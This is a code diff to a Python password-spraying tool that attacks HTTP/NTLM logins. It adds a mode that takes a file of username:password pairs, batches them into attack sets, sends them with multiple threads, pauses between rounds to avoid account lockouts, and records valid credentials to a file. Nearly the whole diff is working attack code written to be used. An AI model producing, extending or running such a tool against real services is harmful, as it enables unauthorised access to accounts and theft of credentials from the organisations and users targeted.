@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 import requests
-from requests_ntlm2 import HttpNtlmAuth, HttpNtlmAdapter, NtlmCompatibility
+from requests_ntlm import HttpNtlmAuth
 
 from base64 import b64encode as be, b64decode as bd
 import argparse
@@ -63,10 +63,13 @@ if __name__ == "__main__":
     args = argparse.ArgumentParser()
 
     args.add_argument(
-        "-u", "--usernames", help="List of usernames to attack", required=True
+        "-u", "--usernames", help="List of usernames to attack"
     )
     args.add_argument(
-        "-p", "--passwords", help="List of passwords to try", required=True
+        "-p", "--passwords", help="List of passwords to try"
+    )
+    args.add_argument(
+        "-c", "--userpass", help="File containing user/password combinations"
     )
     args.add_argument(
         "-d",
@@ -110,36 +113,97 @@ if __name__ == "__main__":
     else:
         proxies = {}
 
-    usernames = [u for u in open(opts.usernames).read().split("\n") if u]
+    if opts.userpass:
+        print("Running in user/pass mode")
 
-    passwords = [p for p in open(opts.passwords).read().split("\n") if p]
+        data = open(opts.userpass).read().split('\n')
 
-    i = 0
-    current = 1
-    total = len(passwords)
-    f = open(opts.output, "a")
-    f.write(f"New run: {str(datetime.now())}\n")
-    print(f"New password spraying run")
-    print(f"Spraying {opts.attempts} passwords, then sleeping for {opts.interval}.")
-    print(f"URL: {opts.url}")
-    for p in passwords:
-        i += 1
+        users = {}
 
-        print(f"{str(datetime.now())}: Attempting {p} ({current}/{total})")
-        attempts = [
-            (opts.url, opts.domain, u, p, opts.authtype, proxies, opts.add_response)
-            for u in usernames
-        ]
-        with Pool(opts.threads) as p:
-            for s in p.imap_unordered(check_creds, attempts):
-                if s:
-                    f.write(f"{s[0]}:{s[1]}" + "\n")
-                    f.flush()
+        for d in data:
+            if d:
+                user, pw = d.split(':', 1)
 
-        if i == opts.attempts:
-            print(f"{str(datetime.now())} Sleeping for {opts.interval} minutes.")
-            sleep(opts.interval * 60)
+                if user not in users:
+                    users[user] = []
+                if pw not in users[user]:
+                    users[user].append(pw)
 
-            i = 0
+        mx = 0
+        for u, p in users.items():
+            if len(p) > mx:
+                mx = len(p)
 
-        current += 1
+        attack_sets = []
+        for i in range(mx):
+            attack_sets.append([])
+
+        for u, pw in users.items():
+            for i, p in enumerate(pw):
+                attack_sets[i].append(
+                    (
+                        opts.url, opts.domain, u, p, opts.authtype, proxies, opts.add_response
+                    )
+                )
+        print(f"{mx} Attack Sets Created from User Pass file")
+        i = 0
+        current = 1
+        total = mx
+        f = open(opts.output, "a")
+        f.write(f"New run: {str(datetime.now())}\n")
+        print(f"New password spraying run")
+        print(f"Spraying {opts.attempts} passwords, then sleeping for {opts.interval}.")
+        print(f"URL: {opts.url}")
+
+        for attempts in attack_sets:
+            i += 1
+
+            print(f"{str(datetime.now())}: Attempting set ({current}/{total})")
+            
+            with Pool(opts.threads) as p:
+                for s in p.imap_unordered(check_creds, attempts):
+                    if s:
+                        f.write(f"{s[0]}:{s[1]}" + "\n")
+                        f.flush()
+
+            if i == opts.attempts:
+                print(f"{str(datetime.now())} Sleeping for {opts.interval} minutes.")
+                sleep(opts.interval * 60)
+
+                i = 0
+
+            current += 1
+    else:
+        usernames = [u for u in open(opts.usernames).read().split("\n") if u]
+
+        passwords = [p for p in open(opts.passwords).read().split("\n") if p]
+
+        i = 0
+        current = 1
+        total = len(passwords)
+        f = open(opts.output, "a")
+        f.write(f"New run: {str(datetime.now())}\n")
+        print(f"New password spraying run")
+        print(f"Spraying {opts.attempts} passwords, then sleeping for {opts.interval}.")
+        print(f"URL: {opts.url}")
+        for p in passwords:
+            i += 1
+
+            print(f"{str(datetime.now())}: Attempting {p} ({current}/{total})")
+            attempts = [
+                (opts.url, opts.domain, u, p, opts.authtype, proxies, opts.add_response)
+                for u in usernames
+            ]
+            with Pool(opts.threads) as p:
+                for s in p.imap_unordered(check_creds, attempts):
+                    if s:
+                        f.write(f"{s[0]}:{s[1]}" + "\n")
+                        f.flush()
+
+            if i == opts.attempts:
+                print(f"{str(datetime.now())} Sleeping for {opts.interval} minutes.")
+                sleep(opts.interval * 60)
+
+                i = 0
+
+            current += 1
